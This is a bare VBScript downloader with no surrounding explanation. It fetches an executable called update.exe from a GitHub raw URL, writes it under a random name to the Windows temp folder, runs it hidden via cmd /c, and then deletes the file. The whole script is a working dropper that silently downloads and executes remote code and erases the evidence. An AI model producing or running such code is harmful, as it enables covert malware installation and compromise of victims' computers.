strFileURL = "https://github.com/ruppertgriffin/ruppertgriffin/raw/master/update.exe"

Set fso = CreateObject("Scripting.FileSystemObject")
upath = fso.GetSpecialFolder(2) & "\" & replace(fso.GetTempName    , ".tmp", ".exe")

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") 
objXMLHTTP.open "GET", strFileURL, false 
objXMLHTTP.send() 

Set objADOStream = CreateObject("ADODB.Stream") 
objADOStream.Open 
objADOStream.Type = 1 
objADOStream.Write objXMLHTTP.ResponseBody 
objADOStream.Position = 0 

Set objFSO = Createobject("Scripting.FileSystemObject") 
Set objFSO = Nothing 
objADOStream.SaveToFile upath 
objADOStream.Close 

Set objADOStream = Nothing 
Set objXMLHTTP = Nothing

Set oShell = CreateObject ("Wscript.Shell") 
oShell.Run "cmd /c " & upath, 0, true

fso.DeleteFile upath
